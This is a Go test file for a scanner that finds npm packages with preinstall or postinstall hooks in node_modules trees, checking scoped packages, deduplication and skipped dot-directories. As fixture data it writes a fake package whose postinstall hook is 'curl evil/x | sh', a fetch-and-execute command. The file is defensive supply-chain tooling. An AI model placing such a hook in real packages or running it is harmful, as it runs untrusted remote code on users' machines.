package scripts

import (
	"os"
	"path/filepath"
	"sort"
	"testing"
)

func writePJ(t *testing.T, dir, name, version, hookName, hookBody string) {
	t.Helper()
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	body := `{"name":"` + name + `","version":"` + version + `"`
	if hookName != "" {
		body += `,"scripts":{"` + hookName + `":"` + hookBody + `"}`
	}
	body += `}`
	if err := os.WriteFile(filepath.Join(dir, "package.json"), []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestScanInstalled_BasicAndScoped(t *testing.T) {
	root := t.TempDir()

	// node_modules/evil-pkg with a postinstall
	writePJ(t, filepath.Join(root, "node_modules", "evil-pkg"),
		"evil-pkg", "1.0.0", "postinstall", "curl evil/x | sh")
	// node_modules/@scope/inner with a preinstall
	writePJ(t, filepath.Join(root, "node_modules", "@scope", "inner"),
		"@scope/inner", "2.0.0", "preinstall", "node spy.js")
	// node_modules/benign — scripts but only "test" (not a lifecycle hook)
	writePJ(t, filepath.Join(root, "node_modules", "benign"),
		"benign", "0.1.0", "test", "jest")
	// hoisted duplicate of evil-pkg under a nested node_modules — should dedup
	writePJ(t, filepath.Join(root, "node_modules", "wrapper", "node_modules", "evil-pkg"),
		"evil-pkg", "1.0.0", "postinstall", "duplicate that should dedup")

	hits, err := ScanInstalled(root)
	if err != nil {
		t.Fatal(err)
	}
	sort.Slice(hits, func(i, j int) bool { return hits[i].Name < hits[j].Name })
	if len(hits) != 2 {
		t.Fatalf("len(hits)=%d, want 2 (%+v)", len(hits), hits)
	}
	if hits[0].Name != "@scope/inner" || hits[0].Hooks["preinstall"] == "" {
		t.Errorf("scoped hit shape: %+v", hits[0])
	}
	if hits[1].Name != "evil-pkg" || hits[1].Hooks["postinstall"] == "" {
		t.Errorf("unscoped hit shape: %+v", hits[1])
	}
}

func TestScanInstalled_EmptyTreeReturnsNil(t *testing.T) {
	root := t.TempDir()
	hits, err := ScanInstalled(root)
	if err != nil {
		t.Fatal(err)
	}
	if len(hits) != 0 {
		t.Errorf("expected no hits in empty tree, got %v", hits)
	}
}

func TestScanInstalled_SkipsDotDirsAndGit(t *testing.T) {
	root := t.TempDir()
	writePJ(t, filepath.Join(root, ".git", "node_modules", "evil-in-git"),
		"evil-in-git", "1.0.0", "postinstall", "no")
	writePJ(t, filepath.Join(root, "node_modules", ".bin-like-dir"),
		"shouldnt-load", "0.0.0", "postinstall", "no")
	hits, err := ScanInstalled(root)
	if err != nil {
		t.Fatal(err)
	}
	for _, h := range hits {
		if h.Name == "evil-in-git" {
			t.Errorf("walker descended into .git: %+v", h)
		}
		if h.Name == "shouldnt-load" {
			t.Errorf("walker entered dot-prefixed node_modules entry: %+v", h)
		}
	}
}
